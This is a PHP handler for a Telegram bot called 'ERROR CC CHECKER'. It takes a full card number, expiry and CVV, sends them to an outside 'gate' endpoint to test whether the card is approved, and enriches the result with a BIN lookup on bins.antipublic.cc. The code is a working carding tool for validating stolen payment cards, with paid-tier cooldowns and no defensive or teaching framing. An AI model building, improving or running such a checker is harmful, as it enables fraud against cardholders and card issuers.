<?php

require_once __DIR__ . "/../db.php";
require_once __DIR__ . "/../users.php";
date_default_timezone_set("Asia/Kolkata");
/* ========= CHAT ID ========= */
$chatId = $msg["chat"]["id"];
$userId = $user["id"];

/* ========= ROLE CONFIG ========= */
if ($dbUser["role"] === "owner") {
    $cooldown = 0;
    $speed = 1;
} elseif ($dbUser["role"] === "pro") {
    $cooldown = 5;
    $speed = 2;
} else {
    $cooldown = 10;
    $speed = 1;
}

/* ========= COOLDOWN CHECK ========= */
if ($cooldown > 0 && !empty($dbUser["last_check"])) {
    $diff = time() - strtotime($dbUser["last_check"]);
    if ($diff < $cooldown) {
        tg("sendMessage", [
            "chat_id" => $chatId,
            "text" => "⏳ <b>Please wait ".($cooldown - $diff)."s before next check</b>",
            "parse_mode" => "HTML"
        ]);
        exit;
    }
}

/* ========= SAVE CHECK TIME ========= */
$pdo->prepare("UPDATE users SET last_check = NOW() WHERE id = ?")
    ->execute([$userId]);

/* ========= ARG ========= */
$args = extractArgs($text);
if ($args === "") {
    tg("sendMessage", [
        "chat_id" => $chatId,
        "text" => "❌ <b>Usage:</b>\n/chk cc|mm|yy|cvv",
        "parse_mode" => "HTML"
    ]);
    exit;
}

/* ========= CC ========= */
$p = explode("|", $args);
if (count($p) !== 4) {
    tg("sendMessage", [
        "chat_id" => $chatId,
        "text" => "❌ <b>Invalid CC format</b>",
        "parse_mode" => "HTML"
    ]);
    exit;
}

[$cc, $mm, $yy, $cvv] = array_map("trim", $p);
if (strlen($yy) === 2) $yy = "20$yy";
$cc_full = "$cc|$mm|$yy|$cvv";

/* ========= GATE ========= */
$gate = $pdo->query("SELECT * FROM gates WHERE status='active' LIMIT 1")->fetch();
if (!$gate) {
    tg("sendMessage", [
        "chat_id" => $chatId,
        "text" => "⚠️ <b>No active gate available</b>",
        "parse_mode" => "HTML"
    ]);
    exit;
}

/* ========= PROGRESS BAR ========= */
$bars = [
    "▰▱▱▱▱▱▱▱▱▱ 10%",
    "▰▰▱▱▱▱▱▱▱▱ 20%",
    "▰▰▰▱▱▱▱▱▱▱ 30%",
    "▰▰▰▰▱▱▱▱▱▱ 40%",
    "▰▰▰▰▰▱▱▱▱▱ 50%",
    "▰▰▰▰▰▰▱▱▱▱ 60%",
    "▰▰▰▰▰▰▰▱▱▱ 70%",
    "▰▰▰▰▰▰▰▰▱▱ 80%",
    "▰▰▰▰▰▰▰▰▰▱ 90%"
];

$loading = tg("sendMessage", [
    "chat_id" => $chatId,
    "text" => "⏳ <b>Checking Card...</b>\n\n{$bars[0]}",
    "parse_mode" => "HTML"
]);

if (!isset($loading["result"]["message_id"])) exit;
$mid = $loading["result"]["message_id"];

/* ========= START ========= */
$start = time();
$apiResult = null;

for ($i = 1; $i < count($bars); $i++) {

    if ($i === 4 && $apiResult === null) {
        $resp = @file_get_contents($gate["endpoint"] . urlencode($cc_full));
        if ($resp !== false) {
            $apiResult = json_decode($resp, true);
        }
    }

    tg("editMessageText", [
        "chat_id" => $chatId,
        "message_id" => $mid,
        "text" => "⏳ <b>Checking Card...</b>\n\n{$bars[$i]}",
        "parse_mode" => "HTML"
    ]);

    usleep((int)(1000000 / $speed));
}

/* ========= FINAL API FALLBACK ========= */
if ($apiResult === null) {
    $resp = @file_get_contents($gate["endpoint"] . urlencode($cc_full));
    $apiResult = $resp ? json_decode($resp, true) : [];
}

/* ========= BIN ========= */
$bin6 = substr($cc, 0, 6);
$binJson = @file_get_contents("https://bins.antipublic.cc/bins/$bin6");
$binData = $binJson ? json_decode($binJson, true) : [];

$bank    = h($binData["bank"] ?? "N/A");
$type    = h(trim(($binData["type"] ?? "") . " " . ($binData["brand"] ?? "")));
$country = h(($binData["country_name"] ?? "N/A"));

$took = number_format(time() - $start, 2);
$currentTime = date("h:i:s A"); // 12-hour AM/PM (IST)

$checkerUser = "<a href='tg://openmessage?user_id={$chatId}'>".h($user["first_name"])."</a>";

addCheck($userId);

/* ========= FINAL ========= */
$status = ($apiResult["Status"] ?? "") === "Approved" ? "Approved ✅" : "Declined ❌";
$response = h($apiResult["Response"] ?? "Declined");

$final =
"<b>ERROR CC CHECKER</b>\n\n".
"<b>[π] Card –</b> <code>".h($cc_full)."</code>\n".
"<b>[π] Status –</b> <code>{$status}</code>\n".
"<b>[π] Gateway –</b> <code>".h($gate["name"])."</code>\n".
"<b>[π] Response –</b> ".h($apiResult["Response"] ?? "Approved")."\n".
"<b>[π] Bin –</b> <code>{$bin6}</code>\n".
"<b>[π] Issuer –</b> <code>{$bank}</code>\n".
"<b>[π] Info –</b> <code>{$type}</code>\n".
"<b>[π] Country –</b> <code>{$country}</code>\n".
"<b>[π] Checked by –</b> {$checkerUser}\n".
"<b>[π] Took Time –</b> <code>{$took} sec</code>\n\n".
"<i>Developed by</i> @ERRORxFF\n".
"<i>© {$currentTime}</i>";

/* ========= FINAL EDIT ========= */
tg("editMessageText", [
    "chat_id" => $chatId,
    "message_id" => $mid,
    "text" => $final,
    "parse_mode" => "HTML"
]);